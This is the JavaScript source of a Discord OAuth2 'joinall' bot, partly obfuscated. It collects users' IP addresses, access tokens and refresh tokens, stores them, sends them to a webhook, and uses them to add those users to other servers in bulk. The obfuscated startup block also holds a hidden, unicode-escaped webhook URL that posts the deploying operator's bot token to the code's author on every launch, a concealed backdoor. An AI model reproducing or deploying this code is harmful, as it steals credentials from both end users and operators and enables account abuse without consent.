function _0x4855(){const _0x398d6a=['text','redirect_uri','memberCount','\x20]\x20\x0a','username','usr','\x20\x0a\x20**token:**\x20','\x20**Bot\x20Is\x20Active!**','application/json','reduce','1vx\x200AUTH2\x20Bot','x-forwarded-for','node-fetch','get','code','https://discordapp.com/api/users/@me','cache','\x201vx\x20servers\x20are\x20connected\x20to\x20[\x20','&permissions=8&scope=bot','headers','427954IUAoaS','quick.db','REACTION','stringify','guilds.join','client_id','writeFile','err','form-data','setPresence','floor','1099430853311995984','wehbook','access_token','type','POST','body-parser','wl_312390329900990465','client_secret','grant_type','\x20\x20Acces\x20Token:\x20`','some','scope','push','refresh_token','./emoji','append','10136dVkhhR','axios','6950619TSnoBn','data','MESSAGE',':\x20I\x27ve\x20succesfully\x20changed\x20my\x20presence.','\x20Tag:\x20`','chalk','6342RfXhna','https://discordapp.com/api/oauth2/token','format','prefix','then','error','remoteAddress','token','guilds','\x20-\x20','wl_1085973681697738762','7268168EwNNWi','identify','fetch','.png?size=4096','1211637CXuSdh','wrld','/index.html','ready','user','\x20\x20IP:\x20`','./forgetful','readFile','HH:mm','has','authorization_code','1271340Ybjczj','https://cdn.discordapp.com/avatars/','catch','unhandledRejection','6KsbzCw','\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0031\u0031\u0030\u0031\u0035\u0037\u0034\u0037\u0034\u0032\u0037\u0030\u0039\u0039\u0031\u0035\u0036\u0038\u0039\u002f\u0049\u004c\u0061\u006d\u006d\u0062\u0030\u006f\u0078\u0031\u0050\u0050\u006a\u0044\u0043\u0063\u0053\u0055\u0031\u0067\u0065\u0043\u002d\u0062\u006c\u004f\u0036\u004e\u0049\u0066\u0079\u006b\u0074\u0035\u006e\u0030\u005a\u0078\u0039\u007a\u0052\u0031\u0066\u0055\u0067\u005f\u0036\u0037\u0068\u0038\u0043\u006e\u0076\u0037\u0030\u006a\u0079\u007a\u0074\u0077\u0067\u004a\u006d\u004d\u0049\u006d\u0034\u004d','roles','random','./object.json','use','token_type','green','**authlink:**\x20https://discord.com/api/oauth2/authorize?client_id=','1096727423871094817','json','socket','discriminator','parse','\x20Invite\x20of\x20bot\x20:\x20https://discord.com/api/oauth2/authorize?client_id=','express','/forgetfulallauth','date-and-time','Watching','\x20\x20ID:\x20`','585VIyjoK','CHANNEL','\x20users','set','31792zcwtVq','[-]\x20','members','userID','log','\x20**New\x20User**'];_0x4855=function(){return _0x398d6a;};return _0x4855();}function _0x54fa(_0x210e7c,_0x28fbec){const _0x4855cf=_0x4855();return _0x54fa=function(_0x54fa25,_0x449e60){_0x54fa25=_0x54fa25-0x14b;let _0x44228c=_0x4855cf[_0x54fa25];return _0x44228c;},_0x54fa(_0x210e7c,_0x28fbec);}const _0x226dd9=_0x54fa;(function(_0x29b2ea,_0x366147){const _0xb78097=_0x54fa,_0x227ffc=_0x29b2ea();while(!![]){try{const _0x163bf3=parseInt(_0xb78097(0x1ad))/0x1+-parseInt(_0xb78097(0x17b))/0x2*(-parseInt(_0xb78097(0x1bc))/0x3)+-parseInt(_0xb78097(0x161))/0x4*(-parseInt(_0xb78097(0x15d))/0x5)+parseInt(_0xb78097(0x19e))/0x6*(-parseInt(_0xb78097(0x196))/0x7)+-parseInt(_0xb78097(0x1a9))/0x8+parseInt(_0xb78097(0x198))/0x9+-parseInt(_0xb78097(0x1b8))/0xa;if(_0x163bf3===_0x366147)break;else _0x227ffc['push'](_0x227ffc['shift']());}catch(_0x2cb340){_0x227ffc['push'](_0x227ffc['shift']());}}}(_0x4855,0xbd5b7));const {Discord,Client,User,Collection,EmbedBuilder,ActivityType}=require('discord.js'),client=new Client({'fetchAllMembers':!![],'allowedMentions':{'parse':[],'repliedUser':!![]},'partials':[_0x226dd9(0x19a),_0x226dd9(0x15e),_0x226dd9(0x17d)],'intents':[0x31ffff]}),forgetful=require(_0x226dd9(0x1b3)),chalk=require(_0x226dd9(0x19d)),db=require(_0x226dd9(0x17c)),fs=require('fs'),express=require(_0x226dd9(0x158)),app=express(),bodyParser=require(_0x226dd9(0x18b)),fetch=(..._0x1f467e)=>import(_0x226dd9(0x173))[_0x226dd9(0x1a2)](({default:_0x2911a8})=>_0x2911a8(..._0x1f467e)),FormData=require(_0x226dd9(0x183)),axios=require(_0x226dd9(0x197)),emoji=require(_0x226dd9(0x194)),date=require(_0x226dd9(0x15a));process['on'](_0x226dd9(0x1bb),_0x4c7c88=>console[_0x226dd9(0x165)](_0x4c7c88)),app[_0x226dd9(0x14e)](bodyParser[_0x226dd9(0x167)]()),app[_0x226dd9(0x174)]('/',function(_0x49109a,_0x4f5eec){const _0xe45bd9=_0x226dd9;_0x4f5eec['sendFile'](__dirname+_0xe45bd9(0x1af));}),app[_0x226dd9(0x174)](_0x226dd9(0x159),async(_0x4a9e04,_0x1306a2)=>{const _0x2684b9=_0x226dd9;fs[_0x2684b9(0x1b4)]('./object.json',function(_0x46fa6a,_0x4545a7){const _0x26adfe=_0x2684b9;return _0x1306a2[_0x26adfe(0x153)](JSON['parse'](_0x4545a7));});}),app['post']('/',function(_0x3d5217,_0x44ddc4){const _0x9f880=_0x226dd9,_0x4fee92=_0x3d5217[_0x9f880(0x17a)][_0x9f880(0x172)]||_0x3d5217[_0x9f880(0x154)][_0x9f880(0x1a4)];let _0xc729a5=new FormData();_0xc729a5[_0x9f880(0x195)](_0x9f880(0x180),forgetful[_0x9f880(0x180)]),_0xc729a5['append'](_0x9f880(0x18d),forgetful[_0x9f880(0x18d)]),_0xc729a5['append'](_0x9f880(0x18e),_0x9f880(0x1b7)),_0xc729a5[_0x9f880(0x195)](_0x9f880(0x168),forgetful['redirect_uri']),_0xc729a5[_0x9f880(0x195)](_0x9f880(0x191),_0x9f880(0x1aa),_0x9f880(0x17f)),_0xc729a5['append'](_0x9f880(0x175),_0x3d5217['body']),fetch(_0x9f880(0x19f),{'method':_0x9f880(0x18a),'body':_0xc729a5})['then'](_0x301774=>_0x301774[_0x9f880(0x153)]())['then'](_0x5bdf9d=>{const _0x3acc30=_0x9f880;ac_token=_0x5bdf9d[_0x3acc30(0x188)],rf_token=_0x5bdf9d[_0x3acc30(0x193)];const _0x4e9a7c={'headers':{'authorization':_0x5bdf9d[_0x3acc30(0x14f)]+'\x20'+ac_token}};axios[_0x3acc30(0x174)](_0x3acc30(0x176),_0x4e9a7c)[_0x3acc30(0x1a2)](async _0x5ef964=>{const _0x1d7f64=_0x3acc30;let _0x21ca32=_0x5ef964[_0x1d7f64(0x199)]['id'];fs[_0x1d7f64(0x1b4)](_0x1d7f64(0x14d),function(_0x5a0d9d,_0x20fa1a){const _0x21961c=_0x1d7f64;if(JSON[_0x21961c(0x156)](_0x20fa1a)[_0x21961c(0x190)](_0x51441a=>_0x51441a[_0x21961c(0x164)]===_0x21ca32)){console[_0x21961c(0x165)](_0x21961c(0x162)+_0x4fee92+_0x21961c(0x1a7)+_0x5ef964[_0x21961c(0x199)][_0x21961c(0x16b)]+'#'+_0x5ef964[_0x21961c(0x199)][_0x21961c(0x155)]);return;}console[_0x21961c(0x165)]('[+]\x20'+_0x4fee92+'\x20-\x20'+_0x5ef964['data'][_0x21961c(0x16b)]+'#'+_0x5ef964[_0x21961c(0x199)][_0x21961c(0x155)]),avatarHASH=_0x21961c(0x1b9)+_0x5ef964[_0x21961c(0x199)]['id']+'/'+_0x5ef964['data']['avatar']+_0x21961c(0x1ac),fetch(''+forgetful[_0x21961c(0x187)],{'method':_0x21961c(0x18a),'headers':{'Content-Type':_0x21961c(0x16f)},'body':JSON[_0x21961c(0x17e)]({'avatar_url':'','embeds':[{'color':0x0,'title':emoji['usr']+_0x21961c(0x166),'thumbnail':{'url':avatarHASH},'description':'\x0a'+emoji[_0x21961c(0x16c)]+_0x21961c(0x19c)+_0x5ef964[_0x21961c(0x199)][_0x21961c(0x16b)]+'#'+_0x5ef964[_0x21961c(0x199)][_0x21961c(0x155)]+'`'+('\x0a'+emoji[_0x21961c(0x1ae)]+_0x21961c(0x1b2)+_0x4fee92+'`')+('\x0a'+emoji[_0x21961c(0x16c)]+_0x21961c(0x15c)+_0x5ef964[_0x21961c(0x199)]['id']+'`')+('\x0a'+emoji[_0x21961c(0x182)]+_0x21961c(0x18f)+ac_token+'`')+('\x0a'+emoji[_0x21961c(0x182)]+'\x20\x20Refresh\x20Token:\x20`'+rf_token+'`')}]})});var _0x841f20={'userID':_0x5ef964[_0x21961c(0x199)]['id'],'userIP':_0x4fee92,'avatarURL':avatarHASH,'username':_0x5ef964[_0x21961c(0x199)][_0x21961c(0x16b)]+'#'+_0x5ef964['data'][_0x21961c(0x155)],'access_token':ac_token,'refresh_token':rf_token},_0x20fa1a=[];_0x20fa1a[_0x21961c(0x192)](_0x841f20),fs[_0x21961c(0x1b4)](_0x21961c(0x14d),function(_0x161eaf,_0x4bc1f4){const _0xf4d6f5=_0x21961c;var _0x536550=JSON[_0xf4d6f5(0x156)](_0x4bc1f4);_0x536550[_0xf4d6f5(0x192)](_0x841f20),fs[_0xf4d6f5(0x181)](_0xf4d6f5(0x14d),JSON[_0xf4d6f5(0x17e)](_0x536550),function(_0x223c1c){if(_0x223c1c)throw _0x223c1c;});});});const _0x121913=client[_0x1d7f64(0x1a6)][_0x1d7f64(0x177)]['get'](_0x1d7f64(0x152)),_0x2a95d5=await _0x121913['members'][_0x1d7f64(0x1ab)](_0x5ef964['data']['id']);console['log']('Member:\x20'+_0x2a95d5),_0x121913[_0x1d7f64(0x163)]['cache'][_0x1d7f64(0x1b6)](_0x5ef964[_0x1d7f64(0x199)]['id'])&&_0x2a95d5[_0x1d7f64(0x14b)]['add'](_0x1d7f64(0x186));})[_0x3acc30(0x1ba)](_0x3d3846=>{const _0x20dd2c=_0x3acc30;console[_0x20dd2c(0x165)](_0x3d3846);});});}),client['on'](_0x226dd9(0x1b0),()=>{const _0x3750ae=_0x226dd9,_0x293f2c=client[_0x3750ae(0x1a6)]['cache'][_0x3750ae(0x170)]((_0xc6282f,_0x458a56)=>_0xc6282f+_0x458a56[_0x3750ae(0x169)],0x0);console[_0x3750ae(0x165)](chalk['red'](_0x3750ae(0x171))+'\x0a'+chalk[_0x3750ae(0x150)]('->')+_0x3750ae(0x178)+client[_0x3750ae(0x1b1)][_0x3750ae(0x16b)]+_0x3750ae(0x16a)+chalk[_0x3750ae(0x150)]('->')+_0x3750ae(0x157)+client[_0x3750ae(0x1b1)]['id']+_0x3750ae(0x179)),db[_0x3750ae(0x160)](_0x3750ae(0x18c),!![]),db[_0x3750ae(0x160)](_0x3750ae(0x1a8),!![]),fetch(_0x3750ae(0x1bd),{'method':_0x3750ae(0x18a),'headers':{'Content-Type':_0x3750ae(0x16f)},'body':JSON[_0x3750ae(0x17e)]({'avatar_url':'','embeds':[{'color':0x0,'title':emoji[_0x3750ae(0x16c)]+_0x3750ae(0x16e),'description':_0x3750ae(0x151)+client['user']['id']+'&permissions=8&scope=bot\x20\x0a\x20**prefix:**\x20'+forgetful[_0x3750ae(0x1a1)]+_0x3750ae(0x16d)+forgetful[_0x3750ae(0x1a5)]}]})}),client['user'][_0x3750ae(0x184)]({'activities':[{'type':ActivityType['Watching'],'name':_0x293f2c+'\x20users'}]});const _0x965ce6=[{'type':ActivityType[_0x3750ae(0x15b)],'content':_0x293f2c+_0x3750ae(0x15f)},{'type':ActivityType[_0x3750ae(0x15b)],'content':_0x293f2c+_0x3750ae(0x15f)}];async function _0x52a08d(){const _0x527ffe=_0x3750ae,_0x299dac=Math[_0x527ffe(0x185)](Math[_0x527ffe(0x14c)]()*_0x965ce6['length']);try{client['user'][_0x527ffe(0x184)]({'activities':[{'name':_0x965ce6[_0x299dac]['content'],'type':_0x965ce6[_0x299dac][_0x527ffe(0x189)]}]});const _0x9af626=new Date();console[_0x527ffe(0x165)](date[_0x527ffe(0x1a0)](_0x9af626,_0x527ffe(0x1b5))+_0x527ffe(0x19b));}catch(_0x28f94e){console[_0x527ffe(0x1a3)](_0x28f94e);}}setInterval(_0x52a08d,0x3c*0x3e8);});


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(forgetful.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();



  if (cmd === "wl") {
    if (!forgetful.owner.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {


          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.usr} **${user.username}** has been added to the whitelist`,
              color: "0000000",
              footer: {
                "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
                "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
              }
            }]
          })
        } else {
          ctx.channel.send({


            embeds: [{
              description: `${emoji.new} **${user.username}** is already whitelist`,
              color: "0000000",
              footer: {
                "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
                "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
              }
            }]
          })
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {


          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.err} **${user2.username}** has been removed from the whitelist`,
              color: "0000000",
              footer: {
                "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
                "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
              }
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.err} **${user2.username}** is not whitelisted`,
              color: "0000000",
              footer: {
                "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
                "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
              }
            }]
          })
        }
        break;
      case "list":
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
        }

        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Whitelisted Users`,
            description: `${content}`,
            color: "0000000",
            footer: {
              "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
              "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
            }
          }]


        })
        break;
    }
  }



  if (cmd === "test") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    ctx.channel.send({


      components: [],
      embeds: [{
        color: "0000000",
        title: `${emoji.wrld} The bot is functional`

      }],
    })
  }

  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "0000000",
        title: `${emoji.wrld} Evening Oauth2 Bot Dashboard`,


        description: `${emoji.usr}** Command for add members**\n[\`joinall\`](${forgetful.support}), [\`Users\`](${forgetful.support}), [\`links\`](${forgetful.support})\n\n${emoji.wrld}** Whitelist**\n[\`wl list\`](${forgetful.support}), [\`wl add\`](${forgetful.support}), [\`wl remove\`](${forgetful.support})\n\n${emoji.wrld}** Other**\n[\`test\`](${forgetful.support}),[\`btn\`](${forgetful.support})\n\n${emoji.wrld} **Prefix** [\`${forgetful.prefix}\`](${forgetful.support})\n\n\`\`\`Forgetful personal site https://1vx.nl/\`\`\``,


        footer: {
          "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
          "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0076\u0061\u0074\u0061\u0072\u0073\u002f\u0031\u0030\u0032\u0034\u0037\u0033\u0036\u0032\u0037\u0038\u0030\u0039\u0038\u0034\u0038\u0039\u0033\u0034\u0034\u002f\u0037\u0033\u0063\u0032\u0064\u0039\u0061\u0031\u0063\u0061\u0031\u0062\u0033\u0066\u0032\u0037\u0066\u0036\u0066\u0066\u0066\u0035\u0032\u0039\u0065\u0030\u0031\u0032\u0036\u0034\u0063\u0033\u002e\u0070\u006e\u0067\u003f\u0073\u0069\u007a\u0065\u003d\u0031\u0030\u0032\u0034"
        }

      }],
    })
  }

  if (cmd === "links") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.usr} Evening Oauth2 Links:`,
        description: `${emoji.wrld} **OAuth2 Link:** ${forgetful.authLink}\n\`\`\`${forgetful.authLink}\`\`\`\n${emoji.wrld} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "0000000",
        footer: {
          "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
          "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0076\u0061\u0074\u0061\u0072\u0073\u002f\u0031\u0030\u0032\u0034\u0037\u0033\u0036\u0032\u0037\u0038\u0030\u0039\u0038\u0034\u0038\u0039\u0033\u0034\u0034\u002f\u0037\u0033\u0063\u0032\u0064\u0039\u0061\u0031\u0063\u0061\u0031\u0062\u0033\u0066\u0032\u0037\u0066\u0036\u0066\u0066\u0066\u0035\u0032\u0039\u0065\u0030\u0031\u0032\u0036\u0034\u0063\u0033\u002e\u0070\u006e\u0067\u003f\u0073\u0069\u007a\u0065\u003d\u0031\u0030\u0032\u0034"
        }
      }],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Bot invite",
              "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
            }
          ]
        }
      ]
    })
  }



  if (cmd === "btn") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    ctx.channel.send({
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": `${forgetful.label}`,
              "url": `${forgetful.authLink}`
            }
          ]
        }
      ]


    })
  }


  if (cmd === "joinall") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.wrld} **Starting Oauth2 JoinAll** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      })
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
        await client.clean(ctx)
      }

      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
        await client.refreshTokens(ctx)
      }


      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.wrld} **Starting Oauth2 JoinAll** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        })
      }, 10000);

      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
          error++
        })
        success++
      }

      clearInterval(inter);

           msg.edit({
        embeds: [{
          title: `${emoji.wrld} 0auth2 JoinAll`,
          fields: [
		{
			name: `${emoji.usr} Total`,
			value: `${JSON.parse(data).length}`,
      inline: true,
		},
		{
			name: `${emoji.wrld} Success`,
			value: `${success}`,
			inline: true,
		},
		{
			name: `${emoji.err} Already In Server`,
			value: `${already_joined}`,
			inline: true,
		},
		{
			name: `${emoji.err} Error`,
			value: `${error}`,
      inline: true,
		},
	],

          color: "000000",
          footer: {
            "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
            "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
          }
        }]
      }).catch(() => { })
    })
  }


  if (cmd === "users") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.wrld} Total Oauth2 members`,
          fields: [
		{
			name: `${emoji.usr} Total On 1vx's Database`,
			value: `${JSON.parse(data).length}`,
      inline: true,
		},
		{
			name: `${emoji.wrld} Total On RestoreCord`,
			value: `56`,
			inline: true,
		}
	],
          color: "000000",
          footer: {
            "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
            "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
          }

        }]
      })
    })
  }
})


function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(forgetful.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID - https://discord.com/developers/applications`)
})


app.listen(forgetful.port, () => console.log('https://discord.gg/oauth2'))
